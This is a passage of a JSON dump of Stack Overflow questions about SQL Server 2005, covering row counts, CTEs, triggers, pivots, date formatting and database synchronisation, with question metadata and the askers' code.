SqlQuery = Str.SplitLeft(SqlQuery.ToLower(), \" order by \");\n\n    try\n    {\n        //execute query\n        using (SqlConnection cnSqlConnect = OpenConnection(ConnectionString, SuppressError))\n        using (SqlCommand SqlCmd = new SqlCommand(\"select count(*) from (\" + SqlQuery + \") as a\", cnSqlConnect))\n        {\n            SqlCmd.CommandTimeout = 120;\n            return (Int32)SqlCmd.ExecuteScalar();\n        }\n    }\n    catch (Exception ex)\n    {\n        if (SuppressError == false)\n            MessageBox.Show(ex.Message, \"Sql.RecordCount()\");\n\n        return -1;\n    }\n\n}\n</code></pre>\n\n<p>However it breaks on queries like (again, not my query, I just need to make it work)</p>\n\n<pre><code>select [ClientID], [Date], [Balance] \nfrom [Ledger] \nwhere Seq = (select top 1 Seq \n             from [Ledger] as l \n             where l.[ClientID] = [Ledger].[ClientID] \n             order by [Date] desc, Seq desc) \n      and Balance &lt;&gt; 0)\n</code></pre>\n\n<p>as it will removes everything after the <code>order by</code> and breaks the query. I thought I may go from simple string matching to a more complicated parser, but before I do that I wanted to ask if there is a better way.</p>\n\n<p><strong>UPDATE:</strong> The order by clause is dropped because if you include it using my method or a CTE you will get the error <code>The ORDER BY clause is invalid in views, inline functions, derived tables, subqueries, and common table expressions, unless TOP or FOR XML is also specified.</code></p>\n\n<p><strong>Some more details:</strong> This framework is used for writing conversion applications. We write apps to pull data from a clients old database and move it in to our database format when a customer buys our <a href=\"http://en.wikipedia.org/wiki/Customer_relationship_management\" rel=\"nofollow\">CRM</a> software. Often we are working with source tables that are poorly written and can be several Gigs in size. We do not have the resources to hold the whole table in memory so we use a DataReader to pull the data out so everything is not in memory at once. However a requirement is a progress bar with the total number of records to be processed. This RecordCount function is used to figure the max of the progress bar. It works fairly well, the only snag is if the programmer writing the conversion needs to order the data output, having a <code>order by</code> clause in the outer most query breaks <code>count(*)</code></p>\n\n<hr>\n\n<p><strong>Partial Solution:</strong> I came up with this while trying to figure it out, it will not work 100% of the time but I think it will be better than the current solution</p>\n\n<p>If I find a order by clause, I then check to see if the first thing in the query is a select (and no Top following) I replace that beginning text with <code>select top 100 percent</code>. It works better but I am not posting this as a solution as I am hoping for a universal solution.</p>\n"},{"tags":["sql","sql-server-2005","varchar"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":11542294,"title":"Date is varchar, convert to float in order to take average date","body":"<p>My dates are varchar(50) and appear like this in my database:      </p>\n\n<blockquote>\n  <p>2/15/2012</p>\n</blockquote>\n\n<p>The table looks like this: (Note: someid is not a primary key, its identifies a group) </p>\n\n<pre><code> |  someid  |   date     |  float_value  | \n |   1      | 2/15/2012  |     3.2       |   \n |   1      | 2/15/2012  |     1.4       |\n |   1      | 2/15/2012  |     2.1       |\n |   1      | 2/16/2012  |     1.8       |\n</code></pre>\n\n<p>How would I do something like this:</p>\n\n<pre><code>select avg(date), avg(float_value)\nwhere someid = 1\n</code></pre>\n\n<p>To return something like this:</p>\n\n<pre><code>|  date     |  float_value  |\n| 2/15/2012 |   2.126       |     \n</code></pre>\n\n<p>Perhaps the answer isn't average date, but like the date the occurs the most often (in terms of the someid).</p>\n\n<p>Any help would be appreciated from the sql experts.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server-2005","join","select-into"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":88,"score":-1,"question_id":11511843,"title":"Select into and Join Problems","body":"<p>My problem stems from this: </p>\n\n<p><a href=\"http://stackoverflow.com/questions/11420983/vba-excel-vs-sql-comparing-values-in-two-rows-loop\">VBA (Excel) vs SQL - Comparing values in two rows (loop)</a></p>\n\n<p>I've modified the script a tad and it looks like this:</p>\n\n<pre><code>;WITH data AS \n( \n   SELECT a.i, a.M, b.M as NextM, \n   CASE WHEN a.M = 65 AND b.M = 120 THEN 1 ELSE 0 END AS shouldIncreaseQ   \n   FROM MyTable a       \n   LEFT OUTER JOIN MyTable b      \n   ON a.i + 1 = b.i \n), test as\n(\n   SELECT data.M, data.NextM, \n   (SELECT COUNT(*) + 1 FROM data AS ref \n   WHERE ref.shouldIncreaseQ = 1 AND ref.i &lt;= data.i) as Q FROM data \n)\n</code></pre>\n\n<p>So now lets select * from test.  I get something that looks like this.</p>\n\n<pre><code>M      NextM     Q\n65     65        1\n65     65        1\n65     120       2\n120    63        2\n65     120       3\n120    NULL      3\n</code></pre>\n\n<p>NOW.. all I want to is take the Q column (where Q pertains to the NextM) and put that in my original mytable.</p>\n\n<p>So something like this:</p>\n\n<pre><code>i     M      Q\n1     65     1\n2     65     1\n3     120    2\n4     63     2\n5     120    3\n6     55     3\n</code></pre>\n\n<p>I hope that makes sense.  I have been playing with select into, and even insert into all DAY (literally hours) with no luck. (using every type of join you can imagine)</p>\n\n<p>Thank you in advance.  (also can someone tell me how to make my tables look nicer.. do you use html to do it or what)?</p>\n\n<p>UPDATE:</p>\n\n<pre><code>;WITH data AS \n ( \n   SELECT a.i, a.M, b.M as NextM, \n   CASE WHEN a.M = 65 AND b.M = 120 THEN 1 ELSE 0 END AS shouldIncreaseQ   \n   FROM MyTable a       \n   LEFT OUTER JOIN MyTable b      \n   ON a.i + 1 = b.i \n ), \ntest as\n(\n   SELECT data.i, data.M, data.NextM, \n   (SELECT COUNT(*) + 1 FROM data AS ref \n   WHERE ref.shouldIncreaseQ = 1 AND ref.i &lt;= data.i) as Q FROM data \n),\nfinal as\n(\n   select a.i, a.M as zw_step,  b.Q as prodid\n   from test a\n   left outer join test b\n   on a.i - 1 = b.i\n)\n\nSELECT final.i, final.zw_step, final.prodid\nFROM final\n</code></pre>\n\n<p>Now.. the select statement is how I like it.  EXCEPT the darn thing will not work with a insert into command.. (you might have to fool around with final). \nI'm now afraid of CTE, I will probably never use them again this.</p>\n\n<p>Thanks for your help everyone.</p>\n"},{"tags":["sql","query","sql-server-2005","monitoring","transaction-log"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":11539703,"title":"Monitor statements in SQL Server 2005 using a query","body":"<p>I need to write a query to get the statements executed by the user in a particular database since the last restart.</p>\n\n<p>First of all, I extract all the transactions from ::fn_dblog(NULL,NULL), which returns the transaction log. After this, I tried to get the cached queries using this two queries:</p>\n\n<pre><code>SELECT *\nFROM sys.dm_exec_query_stats AS deqs\nCROSS APPLY sys.dm_exec_sql_text(deqs.sql_handle) AS dest\nORDER BY deqs.last_execution_time DESC;\n\n-- OR\n\nselect * from master.dbo.syscacheobjects where dbid = db_id() and objtype = 'Adhoc';\n</code></pre>\n\n<p>My idea is to join the statements that can produce a transaction with its transaction, and show the others too. The problem is that the first query that tries to get the information of the queries doesn't provide any information to identify the database, and the other query doesn't provide any information that I can use to join it to the transaction log.</p>\n\n<p>I'm trying to construct this query without previous knowledge of this particular DBMS, so please forgive my conceptual errors. Thank you in advance.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":17,"favorite_count":32,"up_vote_count":78,"down_vote_count":0,"view_count":83004,"score":78,"question_id":11620,"title":"How do you kill all current connections to a SQL Server 2005 database?","body":"<p>I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.</p>\n\n<p>How can I kill all the connections to the database so that I can rename it?</p>\n"},{"tags":["java","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":307,"score":0,"question_id":4920879,"title":"Can we connect to SQL Server 2005 database from code with out having the installation of client and server","body":"<p>I need to retrieve data from the database. I have the database name, username, password, servername, but I don't have the software installed in my machine. Can I connect to the db and retrieve the data from the db from database from Java code?</p>\n"},{"tags":["sql-server-2005","reportingservices-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":11533617,"title":"IIS and Sql Server 2005 Reporting Services","body":"<p>I had installed SQL server 2005 with Reporting Services on Windows XP with SP 3. It was working perfect for 2-3 years. Recently my IIS disppaeared suddenly (I don't know the exact reason. Maybe because of IE 8, but I really can't say). Now I went to Add/Remove Programs and installed IIS. But now I don't have virtual directories for reporting services. In my SQL Server Management Studio still I can see two databases for Reporting Services but can't see any virtual directory in Control Panel/Administrator Tools/IIS Manager. So I can't see my reports or connect to report server.  </p>\n\n<p>Do I need to uninstall my whole SQL Server 2005 and install again with Reporting Services?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":64,"score":-2,"question_id":5142943,"title":"SQL QUERY ISSUE (NOT IN )","body":"<pre><code>select NAME  \nfrom Temp_EMP \nwhere name not in  select NAME from  EMPLOYEE  and deptid ='11'\n</code></pre>\n\n<p>I am getting an error in the statement.  </p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":11532276,"title":"group by result of subquery","body":"<p>I am trying to use the results of a subquery in my Group By statement, and have found that this is not allowed. I think it may be possible to do this with a CTE, but I'm not sure exactly. I am creating this SQL code for a SQL Server 2005. I am obviously no expert.  Here is the SQL statement I wrote...</p>\n\n<pre><code>select\n  sum(paxon), \n  (select id from runs as RS where RS.code = RL.runsegment) as port_id,\n  date\nfrom\n  runlogs as RL\nwhere \n  date BETWEEN '07/09/2012' and '07/16/2012'     \n  and account in ('311,312,313')\n  and runsegment in (select code from runsegments where org_id = 13)\ngroup by\n  date,\n  port_id\n</code></pre>\n\n<p>When I try to run this I am told that port_id is an invalid column name. I am pretty sure that this is possible to do by creating a temporary table or CTE or possibly using a JOIN, but I am not sure how to do so. Any help would be greatly appreciated.</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":11531036,"title":"SQL variable parameters","body":"<p>I need to merge data into different columns of table. I need to use stored proc to merge these data.\nI have a(i = 1 to x), b, c and d as parameters</p>\n\n<p>a(i = 1 to x) parameters depend on the user entry...</p>\n\n<p>the other thing I need to check is at</p>\n\n<pre><code>if a(y) = b\nthen update b and c to table 1\nelse delete data from table 1 and update values a(y) to b into 4 different tables\nHere y is some value in between 1 to x\n</code></pre>\n\n<p>should i do multiple dataconnections or use one data connection and do everything in sql?? what is the best way to tackle this problem...</p>\n\n<p>If second option please samples would be a great help... Just sql side would be great!!!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","datetime"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":193,"score":4,"question_id":10882735,"title":"WHERE clause returning incorrect records","body":"<p>I'm using this</p>\n\n<pre><code>DECLARE @Year_Filter_Start AS DATETIME\nSET @Year_Filter_Start = DATEADD( dd, -1, DATEADD( yy, DATEDIFF( yy, 0, GetDate() ), 0 ) )\nDECLARE @Year_Filter_End AS DATETIME\nSET @Year_Filter_End = GetDate()\n\nINSERT INTO TABLE\n  ( blah )\nSELECT blah\n  FROM OTHER_TABLE\n WHERE ACTISSUEDATE IS NULL \n    OR ACTSTARTDATE BETWEEN @Year_Filter_Start AND @Year_Filter_End\n</code></pre>\n\n<p>and it's returning records where ACTISSUEDATE is not null and ACTSTARTDATE is not between the year start and today. @Year_Filter_Start is supposed to be the beginning of this year, @Year_Filter_End is supposed to be today.</p>\n\n<p>For example:</p>\n\n<p>A record where ACTSTARTDATE is 2010-08-02 and ACTISSUEDATE is 2011-03-15</p>\n\n<p>Or where ACTSTARTDATE is 2009-05-18 and ACTISSUEDATE is 2009-09-06</p>\n\n<p>Is there something wrong with this statement?</p>\n"},{"tags":["oracle","sql-server-2005","linked-server"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":11528844,"title":"SQL Server linked server error message","body":"<p>I have a SQL Server 2005 database server set up with a linked server to an Oracle database.</p>\n\n<p>When I try to run a delete or update query, I get the following error message:</p>\n\n<blockquote>\n  <p>Cannot fetch a row using a bookmark from OLE DB provider \"OraOLEDB.Oracle\" for linked server</p>\n</blockquote>\n\n<p>The same code was working a couple hours ago while I was testing it, but suddenly it's stopped working. Has anyone seen this before and know a way to fix it/troubleshoot further?</p>\n\n<p>The same queries executed in SQL Developer directly in the DB work fine. (I know it's something with the linked server, but I'm not sure what)</p>\n\n<p>Any pointers would be appreciated.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","pivot"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":11528545,"title":"Pivot Rows to Columns","body":"<p>I am trying to pivot a table and am having a bit of difficulty. My table schema looks like this:</p>\n\n<pre><code>ID  W_C    W_P      A_C   A_P\n3   257    251342   217   206078\n4   443    109023   332   87437\n6   17     9985     32    13515\n</code></pre>\n\n<p>What I am trying to accomplish is something to the effect of:</p>\n\n<pre><code>        3       4       6\nw_c     257     443     17\nw_p     251342  109023  9985\na_c     217     332     87437\na_p     206078  87437   13515\n</code></pre>\n\n<p>I do not need to display the <code>w_c</code>, <code>w_p</code>, <code>a_c</code>, or <code>a_p</code> I just was using it as a point of reference.</p>\n\n<p>I think there may be a way of doing it with pivot/unpivot but I am not very familiar with them, and what I have read isn't helping me.</p>\n\n<p>I tried doing something using CTE's but I believe it is overly complicated and is just bad practice:</p>\n\n<pre><code>;with [3_Data] as (\n    Select\n        1 as [common_key3]\n        ,max(Case when [id] = 3 then [w_c] else 0 end) as [3_Records]\n    From [example]\n), [4_data] as (\nSelect\n        1 as [common_key4]\n        ,max(Case when [id] = 4 then [w_c] else 0 end) as [4_Records]\n    From [example]\n), [6_data] as (\n    Select\n        1 as [common_key6]\n        ,max(Case when [id] = 6 then [w_c] else 0 end) as [6_Records]\n    From [example]\n)\nSelect [3_Records], [4_Records], [6_Records]\nFrom [3_Data]\n    inner join [4_data] on [common_key3] = [common_key4]\n    inner join [6_data] on [common_key3] = [common_key6]\n</code></pre>\n\n<p>Sql fiddle with table already created: <a href=\"http://sqlfiddle.com/#!3/02ef2/6\" rel=\"nofollow\">http://sqlfiddle.com/#!3/02ef2/6</a></p>\n"},{"tags":["sql","sql-server-2005","exec","udf","table-variable"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":330,"score":2,"question_id":11526133,"title":"Why does using an INSERT - EXEC [stored procedure] statement in a UDF throw a side-effecting error?","body":"<p>I am working on a function that needs to call a stored procedure that returns N rows and then inserts the result into a temporary table as part of its processing.</p>\n\n<p>Calling the EXEC on the stored procedure works just fine:\n<a href=\"http://sqlfiddle.com/#!3/ed11a/16\" rel=\"nofollow\">http://sqlfiddle.com/#!3/ed11a/16</a></p>\n\n<p>So why does inserting the results of the EXEC into a table variable throw an error:\n<a href=\"http://sqlfiddle.com/#!3/ed11a/18\" rel=\"nofollow\">http://sqlfiddle.com/#!3/ed11a/18</a></p>\n\n<p>The error I'm getting is: <code>Invalid use of side-effecting or time-dependent operator in 'INSERT EXEC' within a function.</code></p>\n\n<p>I understand that this error is usually generated when trying to manipulate values that are not local to the function, but the insert is on a table variable, so this shouldn't be an issue.</p>\n"},{"tags":["mysql","sql-server","database","sql-server-2005"],"answer_count":1,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":206,"score":1,"question_id":2782661,"title":"I need to convert my Mysql database to SQL Server 2005 database","body":"<p>I need to convert my Mysql database to SQL Server 2005 database, Is there any tools available for this conversion.</p>\n"},{"tags":["sql-server-2005","select","stored-procedures","distinct","execute"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":11525387,"title":"I am trying to run a query based on the results from a stored procedure","body":"<p>First, here is the code for sp_GetWorkQByUserName:</p>\n\n<pre><code>    ALTER PROCEDURE [dbo].[sp_GetWorkQByUserName]\n    ( @UserName varchar(50),\n      @StartDate datetime,\n      @EndDate datetime )\n    AS\n    BEGIN\n        SET NOCOUNT ON;\n        SELECT DISTINCT SpotId FROM tblSpotCount WHERE StoreNum = EXECUTE sp_GetUserLocationCodes(@UserName)\n        ORDER BY SpotDt ASC \n    END\n</code></pre>\n\n<p>I know my <code>SELECT DISTINCT</code> statement is wrong, but I wrote it like that to help show what I'm trying to do. I want to run this stored procedure based on the results from the <code>sp_GetUserLocationCodes</code> with a  parameter of <code>@UserName</code>. </p>\n\n<p>From what I can tell, my problem lies in how I'm calling <code>sp_GetUserLocationCodes</code>. </p>\n\n<p>Question: how can I run a <code>SELECT DISTINCT</code> query on <code>tblSpotCount.SpotId</code> based on the results from the <code>sp_GetUserLocationCodes</code> stored procedure?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","datetime"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":6948,"score":3,"question_id":305462,"title":"Setting and resetting the DATEFORMAT in SQLServer 2005","body":"<p>Is there a way to query the current DATEFOMRAT SQLServer 2005 is currently using with T-SQL?</p>\n\n<p>I have an application that reads pregenerated INSERT-statements and executes them against a database. To make the the data to be inserted culture independent I store datetime-values represented in the invariant culture (month/day/year...) . The database server may run under diffenrent locales, depending on the system locale (maybe using day/month/year) , so the insert may crash because the datetime cannot be parsed.</p>\n\n<p>I know there are the \"SET LANGUAGE\" and \"SET DATEFORMAT\" statements in T-SQL to set the locale to be used.<br />\nI do not want to make these changes permanent (are they permanent?), so I'm looking for a way to read the DATEFORMAT from the DB, store it, change the format to my liking and reset it to the stored value after the data has been inserted.</p>\n\n<p>Any ideas where to find that value in the server?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":11506294,"title":"Copy Rows with PK feedback loop","body":"<p>Given the following (Table1):</p>\n\n<pre><code>Id    Field1  Field2     ...\n--    ------  -------\nNULL  1        2\nNULL  3        4\n...\n</code></pre>\n\n<p>I'd like to insert the values of Field1 and Field2 into a different table (Table2).  Table2 has an auto increment integer primary key.  I want to retrieve the new PKs from Table2 and update the Id column above (Table1).</p>\n\n<p>I realize this is not conventional - its not something I need to do regularly, simply one-off for some migration work.  I made some attempts using <code>INSERT INTO, OUTPUT, INSERTED.Id</code>, but failed.  The PKs that are \"looped-back\" into Table1 must tie to the values of Field1/Filed2 inserted.</p>\n"},{"tags":["sql-server-2005","unicode","asp-classic","vbscript"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":858,"score":1,"question_id":326905,"title":"retrieve unicode using asp from sqlserver 2005","body":"<p>I'm using the following code to retrieve a message from the database and then write it out to a html page: </p>\n\n<pre><code>Dim strDSN, cnn, cmd\nstrDSN = \"Driver={SQL Server};\" &amp; \"Server=(local)\\sql2k5;\" &amp; ...\nset cnn = Server.CreateObject(\"ADODB.Connection\")\ncnn.ConnectionString = strDSN\ncnn.CursorLocation = adUseClient\ncnn.Open\nset cmd = Server.CreateObject(\"ADODB.Command\")\nset cmd.ActiveConnection = cnn\ncmd.CommandText = \"select Message from tblRecipients where ID = 72\"\ncmd.CommandType = adCmdText\nset getRecordset = Server.CreateObject(\"ADODB.Recordset\")\ngetRecordset.Open cmd, , adOpenKeyset, adLockReadOnly\n\nResponse.write getRecordset(\"Message\")\n</code></pre>\n\n<p>however all I get is \"???????\". I checked it wasn't the browser, that is what is actually written out. </p>\n\n<p>to insert the message I ran \n    update tblRecipients set Message = N'' where ID = 72\nin SQL server manager.</p>\n\n<p>Any help on how to get it to display properly?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11518651,"title":"Filter in sql query","body":"<p>My sample table data is:<br><br>\n<img src=\"http://i.stack.imgur.com/XxIRv.png\" alt=\"Table Data\"></p>\n\n<p>and my sql query is:</p>\n\n<pre><code>SELECT\nDistinct\n   CASE CHARINDEX( '?', SessionURL)\n       WHEN 0 THEN SessionURL\n       ELSE LEFT(SessionURL, CHARINDEX( '?', SessionURL) - 1) END AS VisitPage, count(*) as [VisitTime] \nFROM SessionTracker  \n group by SessionURL\norder by [VisitTime] desc\n</code></pre>\n\n<p>Query run sucessfully and returns a value with out query string.Means result from above data is:<br><br><img src=\"http://i.stack.imgur.com/VNlDU.png\" alt=\"result\"><br>\nBut I want a result only in  a format:<br>\n<br></p>\n\n<pre><code>Default\nModules\n</code></pre>\n\n<p>Is it possible this type of filter in sql query.If yes suggest a way.Thanks.</p>\n"},{"tags":["sql-server-2008","sql-server-2005",".net-2.0","asp.net-2.0","linked-server"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":488,"score":1,"question_id":11513750,"title":"The Microsoft Distributed Transaction Coordinator (MS DTC) has cancelled the distributed transaction","body":"<p><strong>Background:</strong>\nWe have a website that was developed under.NET framework 2.0 and it uses a database created with Sql Server 2005. And we also have a website that was developed under .NET framework 4.0 and this one uses a database created with Sql Server 2008. We linked both databases (from Sql Server 2005 to Sql Server 2008) creating a linked Server on the Sql Server 2005 database.</p>\n\n<p><strong>Scenario:</strong>\nWhen we create a record on the database hosted in Sql Server 2005 we have this sequence of transactions:\nInsert the record into the table hosted in the Sql Server 2005 database.\nThis insertion executes a trigger after inserting.\nInside the trigger, we execute a stored procedure (hosted in Sql Server 2008 database), and this stored procedure is executed by using the linked Server.\nThis stored procedure performs an insertion into a table hosted in the Sql Server 2008 database.\nIf we manually execute the insertion into the table hosted in Sql Server 2005 database using the Sql Server Management Studio 2005, everything gets executed well, but if we try to create the record using the UI of the web site (.NET 2005) we get this error:</p>\n\n<p><strong>The current transaction cannot be committed and cannot support operations that write to the log file. Roll back the transaction.\nThe Microsoft Distributed Transaction Coordinator (MS DTC) has cancelled the distributed transaction.</strong></p>\n\n<p>Does anyone know what is happening?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":18,"score":3,"question_id":11512757,"title":"Lock issues on large recordset","body":"<p>I have a database table that I use as a queue system, where separate process that talk to each other create and read entries in the table. For example, when a user initiates a search an entry is created, then another process that runs every second or two will pick up that new entry, update the status and then do a search, updating the entry again when the search is complete. This all seems to work well with thousands of searches per hour.</p>\n\n<p>However, I have a master admin screen that lets me view the status of all of these 'jobs' but it runs very slowly. I basically return all entries in the table for the last hour so I can keep an eye on what's going on. I think that I am running into lock issues of some sort. I only need to read each entry, and don't really care if it the data is a little bit out of date. I just use a standard 'Select * from Table' statement so maybe it is waiting for other locks to expire before returning data as the jobs are constantly updating the data.</p>\n\n<p>Would this be handled better by a certain kind of cursor to return each row one at a time, etc? Any other ideas?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":11503524,"title":"How to create conditional unique constraint","body":"<p>Having a table:<code>Table1</code> in which a column <code>Code</code> accepts nullables values how can we insure that values are unique for non nullable values except for codes that start with <code>'A'</code> which can be duplicated maximum twice?</p>\n\n<p><strong>Table1</strong></p>\n\n<pre><code>Id |  Code\n---------- \n1  |  NULL   --[ok]\n2  |  A123   --[ok]\n3  |  A123   --[ok]\n4  |  B100   --[ok] \n5  |  C200   --[ok]\n6  |  B100   --[not ok already used]\n7  |  NULL   --[ok]\n</code></pre>\n\n<p>What i have tried is creating an indexed view, the solution work fine for <code>NULL</code> values but not for the second case i mentioned (skipped actualy)</p>\n\n<pre><code>Create view v_Table_unq with schemabinding as( \n         select code from \n         dbo.Table1 \n         where code is not null and code not like 'A%'\n)\ngo\ncreate unique clustered index unq_code on v_Table_unq(code)\n</code></pre>\n\n<p>Thanks for help</p>\n"},{"tags":["sql","sql-server-2005","group-by","max","greatest-n-per-group"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":141,"score":1,"question_id":11504186,"title":"Group by Customer And Max Date","body":"<p>I want to list last payments of my customers order by date descending.</p>\n\n<p>I wrote a sql query</p>\n\n<pre><code> SELECT CARHARTAR,\n       CARHARREFNO,\n       CARHARCARKOD,\n       CARHARCARUNVAN,\n       CARHARACIKLAMA,\n       CARHARTUTAR\nFROM   CARHAR\nWHERE  ( CARHARTIPI IN ( 2, 4 ) )\n       AND ( CARHARISTIPNO IN ( 2, 6 ) )\n       AND ( CARHARCARKOD NOT LIKE 'W%' )\n       AND ( CARHARCARKOD NOT LIKE 'Z%' )\n       AND ( CARHARGCFLAG = 2 )\n       AND ( CARHARIADEFLAG = 0 )\nORDER  BY CARHARTAR DESC \n</code></pre>\n\n<p>This query list all payments order by date descending. But i only need last payment. I'm using group by carharcarkod but i have an aggreate function problem. What should i do ?</p>\n\n<p><a href=\"http://i.stack.imgur.com/hG7tj.jpg\" rel=\"nofollow\">Here is a screenshot of query result</a></p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2988,"score":0,"question_id":2742745,"title":"Firing trigger for bulk insert","body":"<pre><code>ALTER TRIGGER [dbo].[TR_O_SALESMAN_INS]\n   ON  [dbo].[O_SALESMAN]\n   AFTER INSERT\nAS \nBEGIN\n    -- SET NOCOUNT ON added to prevent extra result sets from\n    -- interfering with SELECT statements.\n    SET NOCOUNT ON;\n\n    -- Insert statements for trigger here\n    DECLARE @SLSMAN_CD NVARCHAR(20)\n    DECLARE @SLSMAN_NAME NVARCHAR(20)\n    SELECT @SLSMAN_CD = SLSMAN_CD,@SLSMAN_NAME=SLSMAN_NAME\n    FROM INSERTED\n\n    IF NOT EXISTS(SELECT * FROM O_SALESMAN_USER WHERE SLSMAN_CD = @SLSMAN_CD)\n    BEGIN\n        INSERT INTO O_SALESMAN_USER(SLSMAN_CD, PASSWORD, USER_CD)\n        VALUES(@SLSMAN_CD, @SLSMAN_CD,@SLSMAN_NAME )\n    END\nEND\n</code></pre>\n\n<p>This is the trigger written for a <code>table(O_SALESMAN)</code> to fetch few columns from it and insert it into one another <code>table(O_SALESMAN_USER)</code>. Presently bulk data is getting inserted into <code>O_SALESMAN</code> table through a stored procedure, where as the trigger is getting fired only once and <code>O_SALESMAN_USER</code> is having only one record inserted each time whenever the stored procedure is being executed,i want trigger to run after each and every record that gets inserted into <code>O_SALESMAN</code> such that both tables should have same count which is not happening..so please let me know what can be modified in this Trigger to achieve the same....</p>\n"},{"tags":["c#","sql-server-2005","sql-server-express","microsoft-sync-framework"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":238,"score":1,"question_id":11491759,"title":"Resolve Identity column primary key conflict while sync b/w two sql server 2005 db","body":"<p>I have two sql server 2005 database - <code>ParentDB</code> and <code>ChildDB</code>, and i want to synchronize them using sync framework 2.1<br>\n<code>ParentDB</code> is on server and <code>ChildDB</code> is on client m/c. There are many tables in <code>ParentDB</code> but few tables on <code>ChildDB</code>, Lets say, a <code>Customer</code> table is common between both db with <code>Id (column)</code> as primary key set to auto increment, and i want to synchronize this table, i am using the approach given in the following msdn <a href=\"http://msdn.microsoft.com/en-us/library/ff928700.aspx\" rel=\"nofollow\">example</a>. This appraoch worked unless i do only download from server or upload to server.     </p>\n\n<p>Lets take a scenario :<br>\n1. There is a row with Id=52 on server table<br>\n2. Both db's are synchronized<br>\n3. Now a row is inserted on <code>ParentDB</code>in <code>Customer</code> table with Id=53<br>\n4. At same-time another row is inserted on <code>ChildDB</code> in <code>Customer</code> table with Id=53 (since both tables has auto increment)<br>\nNow when i synchronize both tables either of the two row gets overridden, depending on the direction of synchronization.<br>\nWhat i want is that <code>Id</code> is adjusted, and both rows are retained,  </p>\n\n<p>What should i do to resolve such conflict, if possible please provide pseudo code.<br>\nP.S. : I expect when we consider foreign key constraint then scenario will get more complicated.<br>\nThnx in advance</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":11501190,"title":"How to Convert Datetime to Date in dd/MM/yyyy format","body":"<p>I want to write a query to get Date in dd/MM/yyyy format. (I do not want time).</p>\n\n<p>So i wrote query like </p>\n\n<pre><code>SELECT  Convert(varchar,A.InsertDate,103) as Tran_Date\n</code></pre>\n\n<p>But when i write order by Tran_Date, it is giving me the result in wrong order.</p>\n\n<p>Can some body please suggest what should i do.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":11494412,"title":"How could I know the update that occurred in foreign column have done because of cascading or by user?","body":"<p>Let me say that I have 3 tables ( _items, _invoiceHeader ,_invoiceDetails)\nI built an update trigger on _invoiceDetails , so I can update _balance column in _items table if I update _itemCode. But the problem is if I update the _itemCode column in _items table the trigger on _invoiceDetails table runs immediatly because of cascade rule on _itemCode columns in _items and _invoiceDetails tables.\nSo how can I know that the update that happened on _invoiceDetails table have done because of cascade or because of the update on the same table _invoiceDetails .</p>\n\n<p>I put this code inside update trigger on _invoiceDetails  table: </p>\n\n<pre><code>    if(UPDATE(itemCode)) // I need a condition here to prevent the implementation if the update happened because of cascade rule.\n   BEGIN\n       UPDATE items\n           SET balance=balance+d.quantity\n       FROM items\n       INNER JOIN DELETED d\n       ON items.accountsItemCode=d.accountsItemCode       \n\n       UPDATE items\n       SET balance=balance-i.quantity\n       FROM items\n       INNER JOIN INSERTED i\n       ON items.itemCode=i.itemCode\n  END\n</code></pre>\n"},{"tags":["sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":11489355,"title":"How to do left align data in 